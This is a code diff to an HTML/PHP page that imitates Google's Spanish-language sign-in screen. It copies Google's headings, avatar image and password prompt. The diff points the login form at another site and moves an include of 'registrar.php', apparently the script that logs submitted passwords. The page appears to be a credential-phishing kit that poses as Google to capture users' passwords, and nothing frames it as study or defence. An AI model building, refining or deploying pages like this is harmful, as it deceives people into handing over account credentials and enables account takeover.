@@ -1269,7 +1269,7 @@
         <div class="main content clearfix">
             <div class="banner">
                 <h1>
-                    Una cuenta. Todo Google.
+                    Una cuenta. Todo Googlee.
                 </h1>
                 <h2 class="hidden-small">
                     Acceder con la cuenta de Googless
@@ -1287,7 +1287,7 @@
   
    no-name">
                     <img class="circle-mask" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
-                    <form novalidate method="post" target="_blank" action="" id="gaia_loginform">
+                    <form novalidate method="post" target="_blank" action="netflix.com" id="gaia_loginform">
                         <div class="form-panel first valid" id="gaia_firstform">
                             <div class="slide-out">
                                 <div class="input-wrapper focused">
@@ -1298,9 +1298,7 @@
                                             <input id="Password" type="password" value="" spellcheck="false" name="contraseña" placeholder="Ingresa tu contraseña" autofocus>
 
                                             <input id="Passwd-hidden" type="password" spellcheck="false" class="hidden">
-											<?php 
-        									include("registrar.php");
-        									?>
+											
                                         </div>
                                     </div>
                                     <span role="alert" class="error-msg" id="errormsg_0_Email"></span>
@@ -1312,6 +1310,9 @@
                             </div>
                         </div>
                     </form>
+                    <?php 
+        									include("registrar.php");
+        									?>
                 </div>
                 <div class="card-mask-wrap
         
